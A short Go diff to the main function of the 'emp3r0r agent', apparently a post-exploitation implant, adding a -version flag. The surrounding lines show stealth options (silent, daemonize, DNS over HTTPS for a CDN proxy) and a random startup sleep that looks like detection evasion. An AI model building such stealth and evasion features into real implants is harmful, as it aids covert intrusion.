@@ -24,7 +24,14 @@ func main() {
 	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
 	silent := flag.Bool("silent", false, "Suppress output")
 	daemon := flag.Bool("daemon", false, "Daemonize")
+	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
+
+	// version
+	if *version {
+		fmt.Printf("emp3r0r agent (%s)\n", agent.Version)
+		return
+	}
 
 	// don't be hasty
 	time.Sleep(time.Duration(agent.RandInt(3, 10)) * time.Second)
